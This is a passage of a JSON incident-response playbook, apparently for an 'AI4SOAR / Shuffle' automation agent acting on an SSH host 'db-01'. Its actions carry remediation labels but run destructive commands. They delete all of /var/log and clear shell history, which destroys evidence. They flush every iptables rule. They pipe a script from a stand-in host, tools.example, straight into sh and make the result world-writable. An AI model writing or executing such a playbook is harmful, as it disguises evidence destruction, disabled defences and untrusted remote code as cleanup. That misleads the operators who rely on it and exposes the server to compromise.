    "linux--c3138256-1994-4a45-a78b-a7224ccd8126": {
      "type": "linux",
      "name": "AI4SOAR / Shuffle",
      "address": {
        "ipv4": [
          "127.0.0.1"
        ]
      }
    }
  },
  "target_definitions": {
    "ssh--8d4e9ac0-4217-45f2-8e6c-91500b15da25": {
      "type": "ssh",
      "name": "db-01",
      "address": {
        "dname": [
          "db-01"
        ]
      }
    }
  },
  "workflow_start": "start--fb52871f-8be1-4d22-8032-2e8ebc2ca70a",
  "workflow": {
    "start--fb52871f-8be1-4d22-8032-2e8ebc2ca70a": {
      "type": "start",
      "on_completion": "action--ce4bc3f7-83bc-43f4-8389-74fd876d877b"
    },
    "action--ce4bc3f7-83bc-43f4-8389-74fd876d877b": {
      "type": "action",
      "name": "Remove attacker traces",
      "description": "Delete the logs and the shell history.",
      "agent": "linux--c3138256-1994-4a45-a78b-a7224ccd8126",
      "targets": [
        "ssh--8d4e9ac0-4217-45f2-8e6c-91500b15da25"
      ],
      "commands": [
        {
          "type": "bash",
          "command": "rm -rf /var/log/*"
        },
        {
          "type": "bash",
          "command": "history -c"
        }
      ],
      "on_completion": "action--36367b15-f7f7-4019-bdb6-31539a66e377"
    },
    "action--36367b15-f7f7-4019-bdb6-31539a66e377": {
      "type": "action",
      "name": "Reset the firewall",
      "description": "Start from a clean firewall.",
      "agent": "linux--c3138256-1994-4a45-a78b-a7224ccd8126",
      "targets": [
        "ssh--8d4e9ac0-4217-45f2-8e6c-91500b15da25"
      ],
      "commands": [
        {
          "type": "bash",
          "command": "iptables -F"
        }
      ],
      "on_completion": "action--9b2f5ba2-c0ed-4b91-8433-4fa5f384cf2a"
    },
    "action--9b2f5ba2-c0ed-4b91-8433-4fa5f384cf2a": {
      "type": "action",
      "name": "Install the cleanup tool",
      "description": "Download and run the vendor cleanup script.",
      "agent": "linux--c3138256-1994-4a45-a78b-a7224ccd8126",
      "targets": [
        "ssh--8d4e9ac0-4217-45f2-8e6c-91500b15da25"
      ],
      "commands": [
        {
          "type": "bash",
          "command": "curl -s http://tools.example/cleanup.sh | sh"
        },
        {
          "type": "bash",
          "command": "chmod 777 /opt/cleanup"
        }
      ],
      "on_completion": "end--d8bd9adb-bc2c-4ecd-8e9d-1992817ce3ee"
    },
    "end--d8bd9adb-bc2c-4ecd-8e9d-1992817ce3ee": {
      "type": "end"
    }
  }
}